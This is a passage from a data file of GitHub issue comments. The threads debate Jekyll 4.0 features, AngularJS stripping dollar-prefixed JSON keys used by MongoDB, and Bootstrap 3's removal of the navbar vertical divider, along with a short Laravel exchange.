recommendations Jekyll users would be used to. It also makes it a lot easier to pull that data out into some other repository to make a dedicated official plugin directory whenever that task might be taken on. EDIT Apologies for my poor wording....I regret not having proofed this better. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/414676728,"I would love to see better environment support. For example site.url Right now site.url has an implicit env pattern that is hard coded for development (Source). This is very implizit, hard to understand and remember and not extendable. #5142 I would love to see this extended. Example The pattern could be When jekyll calls a variable, it checks for . The fallback is . So it does not matter if I configure just  order . (This is a copy of ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/414783157,"@friend You can set up all kinds of fallbacks by using multiple config files, as I mentioned in this comment. I've come across this use case myself — I use  for production values, and an additional  for development overrides. When building locally I run ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/415056402,"Is anyone working on i18n support? I noticed @friend's enthusiasm for it, and a lot of interest. I think I can make a significant contribution at the proposal/spec stage. I’ve been working on a multilingual Jekyll site, and I’ve come up with a pretty good plugin-free solution! It’s up at openhousemacau.com, hosted on GitHub Pages with Jekyll 3.7.3. It’s still in active development, but the i18n part is fully functional, and can support any number of locales (not just the two it has now). It’s quite a complete solution, featuring sane (DRY) content management with fallbacks between locales, string translation, and date format localization. It even supports permalink localization, though we ended up not using it for this site. It works by using  Parallel collections for everything ( and , for example) A  key in , set up in a similar way to  Scope path glob patterns in front matter defaults Localized strings in  A liquid include for localizing dates Another liquid include for setting up a bunch of relationships and variables  The biggest issue is that the last liquid include gets called a lot (especially when looping through documents), so site builds get slow quickly. While I can’t open source the entire site, I could open source the i18n system by making a demo site, if there’s interest. Throughout development I’ve kept Jekyll 4.0 in mind, trying to think about how a native solution could eliminate the problems I’ve come up against. I think I’m pretty qualified at this point to submit a complete top-to-bottom specification proposal for discussion. Should I do it? ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/415061483,"So This is just a thought, I can try and make an issue for it with more details and thought through functionality, but I have noticed a potential gap in functionality. If you use the  folder, or have a post that is  in your  folder, then you still need to move things around for your content, like images, to not get published to the generated site. Since a lot of users use  folders for the beginning position of images associated to a post, I was thinking that we could make a new special key to use in posts that you add to the frontmatter. The key would be something like  or  that we merge to an array, and it can define any of the assets that should not be published if they do not match up to any other posts that are being published. So if I have the following in my frontmatter Then the post when in the drafts folder would not copy over any of that folder located at . However, if a post is in  that contains the same frontmatter key/value, then it would get published as it was included in a post that is getting published. This could be done for individual file levels too. The last part would be that unless included and exclusively used for an unpublished post, that the folder/files in question would perform /be acted on exactly as they already are now, where they will be included or excluded based on the  settings. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/415073688,"In Reply to  I am aware of that solution, but it only causes new problems. The Szenario is I have a config-files with 100 lines of config. One, maybe two line of this config needs to be changed for different environments. With your solution, I need to duplicate 99 lines in three files (dev, staging, production) and manually sync them every time I make a change. This is bound to fail! People will forget to sync the changes and the main idea of a staging system (to behave like the production system) will be lost. Other solutions would be a. The one I describe in  Allowing more than one config, one general-config-file for all env, and one config-file for each env. This is similar to the way rails does it. The env-config will overwrite the general-config in case that is needed. c. Your solution, but with the ability to ""include"" or ""reference"" other config files inside the one I call with the jekyll build command. For this I would say ""build with staging-config"" and inside staging config ""use this 1 line and include/use all other lines from this other config-file"". d. …? ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/415078430,"@friend You don't have to duplicate 99 lines for each environment specific config file. When you specify multiple config files at build Jekyll daisy chains them from left to right. Meaning you could have a production config with all settings, and then for your staging and dev configs just add the lines that are unique or change. Jekyll will use everything from the first config, and override whatever comes next. For example, say you have _config.yml (production settings with all configs) and then a staging specific config (e.g. When you run  you'd get the prod , if you run You'd get the staging  along with all the other variables set in . ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/415087105,"Wanted to add a comment about what I noted in Comment that this is essentially a solution for what @friend requested, but a bit more segregated to the standards that we expect blogs to keep for folder/file structure. Instead of making a change to store the content with the post, this just allows you to specify it directly. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/415097650,"@friend So the more I've looked into implementing i18n in Core, the less feasible it became practically. There's huge performance drawbacks, even for sites that only use one language, the time spent rewriting a huge part of the Core internals would very likely be better spent working on other features, and we've garnered feedback from some big users of Jekyll that for them, performance improvements are more important than a huge new breaking feature. Obviously this shouldn't influence our decision as a project all that much, but it did provide us with insight into why a full i18n implementation in Core wouldn't be feasible. What I think we could do is provide baseline APIs upon which a (maybe officially supported) plugin could operate. If you have any such ideas, feel free to shoot them my direction! ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/415246857,"@friend I understand, and I feel the same way about performance. However, I am not completely discouraged! Wouldn't performance impact depend largely on how the feature is designed? I think that my proposed solution wouldn't significantly impact performance for single-language sites (and it wouldn't break Jekyll 3 sites at all). Big disclaimer though I am not a Ruby programmer so I could be completely wrong. I think I'll write up my ideas anyway and post them as a new issue — even if they're not feasible for Core, I hope they'll contribute to the discussion, maybe even inspire some intrepid plugin developer. Or they might help spark some ideas for the baseline APIs you suggested (such low-level discussion is probably a bit out of my league). And still, I've found that i18n is quite doable with vanilla Jekyll 3. IMHO content management can actually be better than with existing plugins, though it's a bit complex to work with on the Liquid side. Some small tweaks to make that easier might be worth implementing; I'd happily settle for making it feel like less of a hack. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/419266066,What are the plans for (Dart) Sass support in Jekyll 4.0 now that the Ruby implementation is deprecated? I'm very interested to hear the responses from the maintainers. ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/419272431,Could libsass be used instead? ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/419360450,"@friend We'll rely on sassc implementation, that is currently removing dependency to Ruby sass ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/419414624,Awesome. Thank you @friend! ,False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/419921211,"It would be great if  would take preference over . So that you could , and include  and do fast iterations over a single page. This is also how e.g.  and other unix tools operate, and more useful than the (current) other way around, because by default. This was also reported in ticket  but stalled as it would be a breaking change. Seems like 4.0 would be a perfect moment. What do you say @friend? (cced as he was planning to work on it) ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/419928579,"@friend I've submitted a PR that should handle what you're looking for, as a side-effect.. Would you be able to give that branch a test-run..? Feedback invited at the PR's url ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/420374494,"@friend @friend Just wanted to share that we confirmed that that PR solves the  vs  issue, so it would be very neat if that could land in 4.0 💟 ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/422570076,"(I suggest this without understanding what would actually be involved in doing it) I'd love to see performance work done regarding glob patterns in frontmatter defaults. I think it's a tremendously useful feature, but it's hampered by the fact that the more useful it is for a project, the more detrimental it is to build times. I use this feature heavily in scenarios where I have a collection of documents which represents different variations of a type of content. For example, in the Sentry marketing resources ""resources"" is a collection, which is broken up into folders representing podcasts, videos, and pdfs. Each of those folders has it's own defaults that are appropriate for the given medium. In smaller collections there isn't much of an issue, but on our docs site, where a collection is 250+ pages, using a wildcard added 2s to a .8s build. ",False,True,False,jekyll/jekyll/6948
jekyll/jekyll/6948/422573399,"Thanks to everyone for the feedback, that's already a lot of food on our plate, we won't be able to implement all your requests, but we'll definitively do our best to fulfill your expectations. We're currently focusing on performance. As we will need your help, we might pick some priority issues and offer rewards thanks to our Open Collective sponsors. Stay tuned. ",False,True,False,jekyll/jekyll/6948
angular.js/angular/1463/7611796,"If you attempt to send {'_id'{'$oid''123'}} as an argument to a resource, the {'$oid''123'} is removed from the http request that is sent. This is a problem, because mongodb uses keys that start with $ as a way to serialize certain objects. As far as I can tell there's no restriction on $ from the strings in a JSON object, so it seems the behavior of parse is wrong. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/10713204,"Angular is stripping the $ because it is used for Angular (mostly) properties/methods and when they are converted to JSON,  they're stripped because it's extraneous. Here's an idea for a solution For certain components, e.g. $resource or $http, allow a special leading sequence (such as ""+$"") to signal that the $ not be stripped. I don't believe this would be a breaking change. So, for this example, '+$oid' would be stripped down to '$oid'. Thoughts? ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/10791720,"Quoting might be a good solution. My question is where the quoting/dequoting would occur. I believe $http is the low level transport. From my point of view, the  ideal solution would be to have $http quote and dequote the identifiers.  That way it would be transparent to my python (mongodb) application. My  angular application would see +$oid as an identifier, but that wouldn't  be so bad. \$ would be a more traditional way to quote it. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/10949786,"Same issue here, writing a plugin for grails and mongodb, I was forced to parse/marshall json object manually to keep the '$xxx' keys in the object received/sent. As a workaround for now, you can send your JSON as a string using a standard or custom json stringifier, same for the parser as the keys would be stripped from the response as well, ex var args = {""$oid""""xxx""}; // MongoJSON is a custom parser/stringifier, also handling a bit of mongodb '10Gen' syntax $http.post('mongo/find', MongoJSON.stringify(args), {transformResponseparseMongoJson}).success(function(data) {     successCallback(data); }).error(function(data){ errorCallback(data); });  function parseMongoJson(data, headerGetter) {     return MongoJSON.parse(data, mongoJsonReviver); }  Still waiting for a proper fix for this issue, actually even passing an object with ""$xx"" keys between scopes seems to strip those keys... ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/12868134,how about writing a custom serializer and replace the default one with $httpProvider.defaults.transformRequest ? current implementation where  contains the problematic stripping json serializer ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/12868213,"I'm not keen on not dropping the  properties during serialization, but I wonder if allowing developers to whitelist properties that should not be stripped would be a sufficient solution to this issue. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/12869100,@friend plus one I think it is a small number of users that this impacts and allows for flexibility unlike service APIs such as the one mentioned above that tend to be near impossible to change. ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/14075463,"plus one I think mongodb and angular will be quite a common stack. With static typed languages on the serverside (where json serialization is handled by 3rd party libs) this is especially problematic, as one has to rebuild all serialization. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/16880558,plus one Would really like a solution to this!!  Thanks! ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/16966222,This is an issue when working with MongoDB based services that are dependent on $ prefixed object properties.  The framework needs to provide an escape mechanism for this. ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/18038679,"I had the same problem (also using MongoDB on the backend) but it seems just manually stringifying the data/params prior to calling the $http service works, i.e. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/19531500,Could this be documented at  right now there's no mention that angular.toJson strips properties starting with a '$'. ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/19974440,"I would like to see the whitelist approach taken, this would seem the simplest solution. Then avoiding $oid removal would be trivial. In the meantime, we had to override the behaviour like this ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/23006649,"Hey guys, I'm new to angularjs. And i'm trying add the data to json file through angular js. If anyone of you helps me i feel very happy. Thanks &amp; regards, krishh ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/23020581,"krishh, github issues is not the right place or manner to request individual help on this topic. email me directly from your email account, or via twitter, and update your github profile with appropriate info if you are going to be requesting help. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/23242034,plus one for a solution to work with MongoDB without doing dodgy workarounds ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/26082902,"Gotta give this a plus one too, one of my colleagues just spent a couple hours getting blindsided by this bug. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/26264386,plus one for this - attempting to use angular.js with mongo (very common?) is a massive pain in the rump ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/28003854,plus one for this ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/28347051,"JSON.NET parser also uses $properties, specifically when strongly typing .NET types it uses $type. Both workarounds above work (stringify and overriding toJsonReplacer), but plus one vote for a configurable whitelist. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/28649211,Sending string instead of JSON is not the solution. Why should the server side code be changed ?? Why should the information protocol change from JSON to string?? This is clearly an issue in Angular.js I am using a framework with expects $ in JSON messages .. i can't fix aother server ?? ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/28649257,"Sending string instead of JSON is not the solution. Why should the server side code be changed ?? Why should the information protocol change from JSON to string?? This is clearly an issue in Angular.js I am using a framework with expects $ in JSON messages .. i can't fix a third party server. BIGGEST BUG, by not allowing something in JSON ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/31418932,plus one Im using mongodb. Im going to change my server code. Not ideal. ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/34065738,plus one I don't think it's fine to compose JSON-formatted data in a non-standard way. ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/34548361,"plus one This is a problem when using operators with MongoDB. Examples would be $inc, $push, $in, $and, and $or. This is very important and it would be great to see a solution prioritized for an upcoming release. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/37924586,plus one Encountered when dealing with  documents which utilise $ref for referencing objects. ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/38763885,"plus one, Angular pls, don't touch my JSON. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/38864864,we're sorry /).(\ ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/39333445,Also encountered when dealing with  documents which utilise $ref for referencing objects. plus one ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/40087719,plus one it's really upsetting ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/40133902,@friend  The way they are ignoring their user base is also upsetting -( -1 ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/40134603,@friend this is charted for 1.3.0. We're getting to it. See  for a perfectly reasonable solution you can use for the time being. ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/40134905,@friend I did not know thanks!! That is really good news! I take back my words then -) plus one ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/40550205,"Priority should be bumped as $http is not JSON compatible.  is a perfectly valid JSON attribute, and Angular has no place stripping attributes here. Ditto goes for attributes prefixed with . Angular should not be stripping anything from $http's json. Angular internal properties should be removed at another point if they are not supposed to be passed to $http. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/40701387,"Whoever thought of this stripping logic should seriously rethink their career... Breaking people's stuff like this and wasting their time investigating this ridiculous problem makes me appreciate Linus Torvalds style of leadership even more... Fix your shit people, don't break something like passing MongoDB DBRefs with such hacks... Wish there was more professional mentality in web development circles, oh well. /rant ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/40738975,"plus one I see a lot of comments on here asking developers to do work arounds or transforms. F that. If angular is adding $properties to objects, angular should know what properties are being added and angular should remove said properties. Having every developer create a list of mongo $ operators or anything else they use that starts with a $ is a sick joke. I don't want to see this fixed, but see angular $ properties make their way back into my objects when I send them to the server. I'm talking about $$hashkey or whatever angular adds. Angular needs to strip those fields and leave other $ fields alone. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/40779726,"Wow, people need to get calm!! The have acknowledge their mistake and they are fixing it for version 1.3.0. What else do you want? Why so angry at them. Thanks to them you have it. If you don't like it you can always stop using it, there are plenty of choices. Be cool guys!! Cheers!!! ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/40794334,"You try to be calm when you're on a budget in a project and you encounter these ""surprises"" at every corner when you try to do something non trivial. As for ""plenty of choices"" - unfortunately AngularJS is so hyped right now that clients are starting to ask for it - I've seen the same thing happening to another genius ""powered by Google"" invention - GWT - some years ago. In a few years we will probably have ""another big thing"" and will be rewriting all frontend code once again. For me the whole Javascript world could be nuked from the orbit and Python or Ruby would merrily take over. But I digress... (And BTW, whitelisting is NOT the solution here - as @friend said, it is just another workaround. Developers should not be forced to care about your implementation internals - don't get me started on directives, transclusions, sibling scopes and other mess you force us to learn about. Just do a proper component model next time around.) ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/40837595,"@friend – we hear you. We all agree that this is a problem. We're on it. The way you are communicating is rude, overly aggressive, and unprofessional. Please see the code of conduct. Fix your attitude or I will remove subsequent inappropriate remarks. Thanks. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/41740405,  ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/45024315,"@friend @friend  is good enough to add an optional parameter of immutability to 'toJsonReplacer' function?, and if it does(http request), object(request body) is immutable. (I ask before my pull request) thx. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/45025155,"when did this get triaged as high priority? should try to get this checked in, imo. @friend --- I don't know if that's necessarily the best way to do it, but I think it would be okay if we only removed , and maybe some of the scope properties. However I think scope parameters are unlikely to be serialized as you generally don't send an entire scope to the backend, so it's probably not even worth worrying about. AFAIK,  is the only property which angular should add to objects that you might actually want to send off. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/45025640,"@friend – was just wondering that. I saw @friend had a fix in the work for this, but it didn't implement @friend's whitelisting approach. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/45026426,"@friend I was going to reply to your comment on the PR, but here's as good a place as any --- So I don't think a whitelist is necessarily the way to go, because what this means is we're saying like,  is allowed because MongoDB might want to use it, but things that aren't known to be useful to mongo shouldn't be sent off. So the reasons why that's problematic are pretty obvious, A) it's another list of things not in angular's control that needs to be maintained, and B) we're likely to exclude people using different toolchains on their server if we do that.  So, we know that Angular has a pretty limited set of keys which it adds directly to objects (not in the prototype chain) --- , and some scope properties like  or  --- but scopes are unlikely to be JSON-ified anyways, so I don't think that's a huge problem. My vote is to just remove own-$$-prefixed properties, or just a specific blacklist of properties which angular adds. It's the least likely to be a breaking change, and the former is the easiest to work around if it does break applications. In other words, I think @friend's PR should be good enough for this, the whitelist is probably not a good idea ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/45027806,"@friend blacklist of properties it's good idea,  for now $http service strip keys with $ in the head.. e.g   {$foo 'bar'} ==&gt; {} , and $foo isn't part of the $scope //current function function toJsonReplacer(key, value) {   var val = value; if (typeof key === 'string' &amp;&amp; key.charAt(0) === '$') {     val = undefined;   } else if (isWindow(value)) {     val = '$WINDOW';   } else if (value &amp;&amp;  document === value) {     val = '$DOCUMENT';   } else if (isScope(value)) {     val = '$SCOPE';   } return val; }  ==&gt; should get a third parameter of immutability or check against a specific blacklist ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/45028086,"is called by , so a third parameter to it isn't going to help much. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/45028300,"And yes, I know that we're stripping anything with  as the first character, this is not good =) ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/45029962,"Even easier, request.body doesn't need replacer, just stringify it -) ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/45038780,Closed via #6253. ,False,True,False,angular.js/angular/1463
angular.js/angular/1463/71796849,"@friend - I hope this is the right place to ask for it, but with the fix of ""only stripping""  attributes, angular now sends  and  attributes back to the server. What is the recommended way of stripping of these attributes now?  (our JAX-RS Json to object mapping doesn't like them). Thanks for any recommendation. ",False,True,False,angular.js/angular/1463
angular.js/angular/1463/71860540,"@friend I don't know how you are using/sendng your objects, but  instances have an overriden  methods that makes sure those properties are removed when calling  on them. (",False,True,False,angular.js/angular/1463
angular.js/angular/1463/71882447,"@friend - thanks a lot. I didn't know where to look for that. we had an incompatible version of angular-resource, without the custom  method. works great after an update. ",False,True,False,angular.js/angular/1463
bootstrap/twbs/9501/18058785,"Hi, has the .divider-vertical for navbars been dropped from bootstrap 3, or is it just a feature overlook? I don't see it in neither docs nor code. ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/29807070,It is very useful! I wonder what was the reason it was dropped... It was not a good practice or something else? ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/30079447,plus one to return vertical divider back. ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/30242395,plus one really don't understand why this was dropped without a reasonable alteranative. ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/30258254,@friend I can't seem to find a statement of the reason why we dropped it? ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/30263970,plus one on bringing this back! ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/30294722,"To be honest, a 1px vertical line didn't seem like something we really needed to create for the masses. In many cases, adding left and right borders to the nav links is the best bet. At other times rolling something completely custom makes more sense given a project's style. I'm still against re-adding it at this point. ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/30336853,"Sure, it is not a necessity, however since the vertical line needs to become a horizontal line when it is collapsing to the mobile interface, it is at least not a trivial thing. And the much more trivial ""divider"" for the drop down is still there. If the divider could be more general and just adapts to be a vertical divider would be a simple option. For consistency in the navigation there should be also the possibility to divide in a vertical way, not only horizontally. ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/30404825,"plus one I agree, this would be good to have it back if possible ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/30891910,"plus one If this is to be removed, then the regular .divider class should be removed too. It makes no sense to drop one and not the other, keep or drop the whole divider idea. Personally I really find them useful - as mentioned above, they are used to great effect when resizing to xs views, where the dividers can be transformed into horizontal ones. ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/31259735,"So since there is such a demand, could you please reopen the ticket, or create a new one and post the link here, so you could at least reevaluate the decision, and then at least tell us why it was removed? ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/31279312,"It did at the time, @friend, because we began adding our own ""dividers"" to the navbar content via s on navbar sub-components and what not. And we cannot remove the dropdown divider now because that would break backward compatibility. Can't do that until v4. A handful of people isn't much demand to us. I don't mean to sound snarky or asshole-ish, so please hear me out. The reason for removing it was stated above already—a 1px line is not difficult to add yourself. Add borders wherever you need them. Come v4, I can imagine us revisiting this to not do borders, but instead use dividers for more utility across viewport ranges, finer tuning of spacing, etc. Until then, it's not likely to be re-added. ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/31416135,"I was trying to find this and figured it wasn't in v3, as stated you should just style borders yourself and using a whole li element within a list doesn't make sense especially in terms of SEO, surely google knows to omit empty elements, but still a whole li element seems like overkill.  This has changed my mind on how it should be now  ) ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/31416341,"Hoping I make sense at this time. Happy new year! ) Using a li as an empty element just to create a dividing border (effectively) has me in semantic stitches, but I've come to realise that I'm marking up a list with potential hierarchy such as a nav, it should be cool to use a list item as a dividing item, between otherwise separate (mildly related) items. The way we code and build these days, being the total semanticist doesn't exactly lending itself to being the app developer that one needs to be. I'll re read this tomorrow / later today and edit if I find myself rather drunk. Stuart Sillitoe // while mobile Freelance Web Developer  ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/32678854,just DIY the old one xD eg. for navbar .navbar .divider-vertical { height 40px; margin 0 9px; border-left 1px solid #f2f2f2; border-right 1px solid #ffffff; } now you have it back! ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/32682552,"Thats wrong, won't work. Try it and look at it when the menu collapsed... @friend, you made a breaking API change for no reason, and this thread shows there is demand, it might be small, but it is there, and it makes your product breaking others work. As a library you should have good reasons for breaking changes. But you don't even know the reason for the removal. This is the kind of library I will avoid in the future, because you never can be sure that the next update breaks your whole design. And your reaction shows, I need to search an alternative soon, because bootstrap should avoid work, and not add to the designers work. ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/32689016,I didn't say where to use it you are absolutely right! ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/32690234,"We've been very vocal about removing or changing things that break backward compatibility (with major releases). We document it in our readme. We tell folks about it in advance of new releases. We also have a pretty good track record of telling folks exactly why we remove things. In this case, I saw no need to implement a vertical divider that  Duplicates the behavior and style of borders between navbar subcomponents (e.g., forms, navs, etc). Was most commonly used to imitate borders on navbar links instead of simply adding s to the navbar anchors.  Moreover, this change happened five months ago. We've kind of passed the time for giving feedback on what makes it into v3, and as I stated above, I have no plans to re-implement this small of a change. I've already commented on the demand aspect. Like other feature requests with dozens of comments (hell, even hundreds of comments at times), if we don't want to add it, we won't. We listen to the needs of the community and try to provide the best solutions whenever possible. However, we also are the ones that maintain this library, and if we don't want to add something as trivial as a divider, we won't. Again, I'm not trying to be an ass about this—it's purely matter of fact. Again, I've very clearly stated why (twice now). Breaking changes from major releases are to be expected. The web moves too fast to lock ourselves into incorrect changes or wrong decisions we made a year earlier. We will continue to break backward compatibility when it suites the wellbeing of the framework. We also do our best to test things out and communicate as clearly as possible what's changed in a release. We callout gotchas, dependency updates, and more as much as possible. We do make mistakes though, and that's why we have bug reports. By that logic we should do anything and everything ever asked of us. And that's a bad argument, and it's something we'll never end up doing. Our goal is to help people build awesome shit on the internet. It's not our job to do every part of your work for you. Our job is to make it easier for you to do your job. Obviously we should make it as easy as possible, but if you're blaming us for you having to add some borders to a framework that provides as much as we do, you might want to rethink your priorities. We don't solve every problem. We solve common problems to the best of our abilities. Fine by me. That's no argument for making this divider come back, but if you feel it's enough to make you choose something else, I won't fight you on it. Thanks for having been a user this long &lt;3. ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/32693949,That is an answer we can live with. TY ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/32695742,"""Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software."" I think the above license allows the creation of other bootstrap forks, interesting... correct me if I am wrong. ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/33286797,  ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/33297466,"Sure, but not having a 1px divider doesn't make Bootstrap save any less time than it already does. Sure, but anything added dilutes everything else. We already have the borders between components, and as I said earlier, we cannot change that until v4. Again, this isn't a lot of people. And they found what they were looking for—we removed the dividers and if you want them, you should add them on your own. This was not needlessly or carelessly destroyed. We removed it because we didn't have a use for them within Bootstrap. If it's not being actively used, why continue to support it? We switched models from explicit dividers as separate elements to implicit ones with s on components. When folks take the time to write responses without thoroughly reading earlier replies from myself or the core team, I'll do my best to address every single point possible to remedy that. I did it earlier, and I'm doing it again because folks keep rehashing the same things. What's a downright shame is the attitude of ""just implement the thing."" That's a shitty outlook to any project and one that I'll never take, here or anywhere else. As maintainers it's our job to question every addition and deletion, trivial or complicated. We love hearing from folks, and we always take that into consideration. However, for Bootstrap v3.x and this particular issue, we won't be adding anything. ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/33333635,"@friend Thanks for taking the time to explain your reasons for dropping it.  While I too used it, your hard work on Bootstrap has made my life so much easier that I can't complain about this one thing.  Bootstrap is a Godsend ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/33335512,"""To be honest, a 1px vertical line didn't seem like something we really needed to create for the masses."" Um, but yet the horizontal divider .divider still exists? Hmm.. flawed reasoning in one way or the other. But, as with many things, now that mdo has stated his opinion, there's no going back... plus one for its return anyway. ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/33335690,"I to need a vertical divider but it doesn't matter, like @friend said bootstrap is a GODSEND. Using tools like bootstrap/angular save me hours every damn day lol. ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/33335978,yep! don't disagree with you there j-walker -- just a quick 10 second fix for hours saved. ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/34351298,@friend You're an exceptional communicator and I'm glad you're maintaining something I depend on. ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/34855616,"plus one bring it back, please ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/34938026,I think this will bring it back in 3.0 .navbar .divider-vertical {     height 50px;     margin 0 9px;     border-right 1px solid #ffffff;     border-left 1px solid #f2f2f2; } .navbar-inverse .divider-vertical {     border-right-color #222222;     border-left-color #111111; } @friend (max-width 767px) {     .navbar-collapse .nav &gt; .divider-vertical {         display none;     } } ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/35363247,plus one to bring it back. but also... plus one to @friend and the core team even if they don't bring it back. ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/36388384,"Thats not even close to the functionality of the divider.  The divider is specific and should divide different intents, not on every cell.  The divider should divide the intents collapsed or otherwise  Yes of course it is possible to do it own our own. But thats obviously not the point. ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/41282042,Get back the divider! ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/42278073,Just use it agin D ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/43866549,"plus one  We're not a handful. Maybe 0,1% of the people would write a comment. So we are a lot. ",False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/43991379,please ,False,True,False,bootstrap/twbs/9501
bootstrap/twbs/9501/44832752,plus one... Why remove something that so many users thing useful? Looks as much smart as Windows removing desktop menu for no real good reason. ,False,True,False,bootstrap/twbs/9501
framework/laravel/15443/177172219,тhe title EXPLAINS EVERYTHING. please WRITE APPROPRIATE FRAMEWORK OR  DO NOT WRITE ANYTHING  ok ? ,False,True,False,framework/laravel/15443
framework/laravel/15443/247326629,please WRITE APPROPRIATE FRAMEWORK OR  DO NOT WRITE ANYTHING ok ? Well despite your attitude i'll paste this comment from stackoverflow ,False,True,False,framework/laravel/15443
framework/laravel/15443/247327251,THX ) Actually its an issue P ,False,True,False,framework/laravel/15443
